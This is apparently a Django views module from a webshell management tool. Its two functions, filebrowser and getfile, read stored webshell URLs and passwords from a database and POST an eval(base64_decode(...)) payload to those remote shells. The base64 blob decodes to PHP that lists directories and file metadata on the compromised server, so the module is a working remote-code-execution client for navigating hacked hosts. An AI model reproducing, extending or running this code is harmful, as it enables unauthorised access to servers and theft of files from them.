import base64
import json
import os
import urllib

from django.http import HttpResponse
from django.shortcuts import render
from db.models import webshell


# Create your views here.
def filebrowser(request):
    # 获取参数ID
    id = request.GET.get('id')
    # 查询数据库
    shell = webshell.objects.get(id=id)
    desk = []
    for d in shell.desk[:-1].split(':'):
        desk.append(d + ":/")
    # 构建请求包
    data = {
        shell.passwd: "@eval(base64_decode($_POST[z0]));",
        'z0': """QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7""",
        'z1': base64.urlsafe_b64encode(shell.ponypath.encode('ascii'))
    }
    data = urllib.parse.urlencode(data).replace('-', '%2B').encode('ascii')
    req = urllib.request.Request(shell.links, data)
    response = urllib.request.urlopen(req)
    compressedData = response.read().decode('utf-8', 'ignore')
    compressedData = compressedData.split('->|')[-1].split('|<-')[0].split('\n')
    # print(compressedData)
    files = []
    for l in compressedData:
        l = l.split('\t')
        if len(l) == 4:
            file = {}
            file['name'], file['time'], file['size'], file['jurisdiction'] = l
            if os.path.isdir(shell.ponypath + "/" + file['name']):
                file['isdir'] = 1
            else:
                file['isdir'] = 0
            files.append(file)
    return render(
        request,
        'file.html',
        {
            'id': shell.id,
            'desk': desk,
            'files': files,
            'ponypath' : shell.ponypath
        }
    )

def getfile(request):
    id = request.GET['id']
    dir = request.GET['dir']
    shell = webshell.objects.get(id=id)
    print(dir)
    data = {
        shell.passwd: "@eval(base64_decode($_POST[z0]));",
        'z0': """QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7""",
        'z1': base64.urlsafe_b64encode(bytes(dir + "/", 'utf-8'))
    }
    data = urllib.parse.urlencode(data).encode('ascii')
    req = urllib.request.Request(shell.links, data)
    response = urllib.request.urlopen(req)
    compressedData = response.read().decode('utf-8', 'ignore')
    print (compressedData)
    compressedData = compressedData.split('->|')[-1].split('|<-')[0].split('\n')
    files = []
    for l in compressedData:
        l = l.split('\t')
        if len(l) == 4:
            file = {}
            file['name'], file['time'], file['size'], file['jurisdiction'] = l
            if os.path.isdir(dir + "/" + file['name']):
                file['isdir'] = "1"
            else:
                file['isdir'] = "0"
            files.append(file)
    if dir[len(dir) - 3:] == "../":
        dir = dir.replace("../","").split('/')
        ponypath = ""
        for i in range(len(dir) - 2):
            ponypath = ponypath + dir[i] + "/"
        dir = ponypath
    if dir[len(dir) - 2:] == "./":
        dir = dir.replace("./", "")
    return HttpResponse(json.dumps({'files':files,'ponypath':dir}))